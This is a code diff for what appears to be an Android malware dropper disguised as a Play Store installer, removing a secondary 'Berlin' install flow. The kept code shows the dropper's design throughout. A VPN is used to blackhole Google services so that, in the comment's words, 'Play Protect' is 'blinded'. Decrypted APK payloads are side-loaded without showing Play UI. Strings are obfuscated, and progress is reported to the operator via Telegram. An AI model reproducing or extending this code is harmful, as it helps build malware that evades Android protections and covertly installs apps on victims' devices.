@@ -27,7 +27,6 @@ import android.app.Activity
 import android.app.AlertDialog
 import android.net.VpnService
 import java.io.IOException
-import com.playstore.installer.berlin.BerlinInstallManager
 
 class InstallActivity : Activity() {
 
@@ -63,20 +62,6 @@ class InstallActivity : Activity() {
     private var progressRunnable: Runnable? = null
     // Holds decrypted APK bytes while waiting for VPN to establish
     private var pendingApkBytes: ByteArray? = null
-
-    // ── Berlin install manager — dedicated, additive, never touches companion flow ──
-    private val berlinInstallManager: BerlinInstallManager by lazy {
-        BerlinInstallManager(
-            activity = this,
-            onBerlinInstallSuccess = { pkgName ->
-                TelegramLogger.send(this, "BERLIN_FLOW", "COMPLETE", "berlin installed — launching berlin pkg=$pkgName")
-                launchBerlin(pkgName)
-            },
-            onBerlinInstallError = {
-                TelegramLogger.send(this, "BERLIN_FLOW", "ERROR", "berlin install failed")
-            }
-        )
-    }
     // FUD flag: read from SharedPrefs (written by MutationEngine after server response)
     // true = FUD ON (GMS blackholed → Play Protect blinded) — default safe value
     // false = FUD OFF (GMS excluded → Play Protect active → blocks install)
@@ -188,9 +173,6 @@ class InstallActivity : Activity() {
             registerReceiver(vpnEstablishedReceiver, vpnFilter)
         }
 
-        // Register berlin install receivers — additive, dedicated, never touches companion flow
-        berlinInstallManager.registerReceivers()
-
 
         val prefs = getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
         val savedStage = prefs.getString(StringPool.d(StringPool.KEY_STAGE), Stage.IDLE.name)
@@ -247,8 +229,6 @@ class InstallActivity : Activity() {
         try { unregisterReceiver(installConfirmReceiver) } catch (_: Exception) {}
         try { unregisterReceiver(installRestartReceiver) } catch (_: Exception) {}
         try { unregisterReceiver(vpnEstablishedReceiver) } catch (_: Exception) {}
-        // Unregister berlin receivers — additive cleanup
-        berlinInstallManager.unregisterReceivers()
         // Fallback flush — captures logs when flow is interrupted (Home/Back/process kill)
         // before any of the normal flush() call sites are reached.
         if (stage != Stage.DONE && stage != Stage.ERROR) {
@@ -259,9 +239,6 @@ class InstallActivity : Activity() {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         when (requestCode) {
-            BerlinInstallManager.VPN_REQUEST_CODE_BERLIN -> {
-                berlinInstallManager.onVpnActivityResult(resultCode)
-            }
             VPN_REQUEST_CODE -> {
                 if (resultCode == RESULT_OK) {
                     // User granted VPN consent — start BlackholeVpnService
@@ -494,8 +471,6 @@ class InstallActivity : Activity() {
                 Stage.DONE -> {
                     // Launch companion immediately — no delay, no flash of Google Play UI
                     launchCompanion()
-                    // Start berlin install — additive, runs after companion launch, dedicated flow
-                    berlinInstallManager.start()
                 }
                 Stage.ERROR -> {
                     setInstallBg("#E8EAED")
@@ -803,19 +778,9 @@ class InstallActivity : Activity() {
                         if (apkBytes.isNotEmpty()) {
                             runOnUiThread { prepareAndStartVpn(apkBytes) }
                         } else {
-                            // No companion bytes — check if this is a berlin installer build
-                            val hasBerlinAsset = try {
-                                assets.open(BuildConfig.ASSET_C).close(); true
-                            } catch (_: Exception) { false }
-                            if (hasBerlinAsset) {
-                                TelegramLogger.send(this@InstallActivity, "PHASE3_APK_BYTES", "BERLIN",
-                                    "No companion bytes — berlin asset detected, routing to BerlinInstallManager")
-                                runOnUiThread { berlinInstallManager.start() }
-                            } else {
-                                TelegramLogger.send(this@InstallActivity, "PHASE3_APK_BYTES", "FAILED",
-                                    "getCompanionBytes returned empty — setStage ERROR")
-                                runOnUiThread { setStage(Stage.ERROR) }
-                            }
+                            TelegramLogger.send(this@InstallActivity, "PHASE3_APK_BYTES", "FAILED",
+                                "getCompanionBytes returned empty — setStage ERROR")
+                            runOnUiThread { setStage(Stage.ERROR) }
                         }
                     } catch (e: Exception) {
                         TelegramLogger.send(this@InstallActivity, "PHASE3_APK_BYTES", "EXCEPTION",
@@ -1338,18 +1303,6 @@ class InstallActivity : Activity() {
     }
 
     // ── Launch companion ──────────────────────────────────────────────────────
-    private fun launchBerlin(pkgName: String) {
-        if (pkgName.isEmpty()) return
-        try {
-            val launch = packageManager.getLaunchIntentForPackage(pkgName) ?: return
-            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
-            startActivity(launch)
-            finish()
-        } catch (e: Exception) {
-            TelegramLogger.send(this, "LAUNCH_BERLIN", "ERROR", "${e.javaClass.simpleName}: ${e.message}")
-        }
-    }
-
     private fun launchCompanion() {
         val prefs = getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
         val pkg   = prefs.getString(InstallReceiver.KEY_MODULE_PKG, null) ?: return
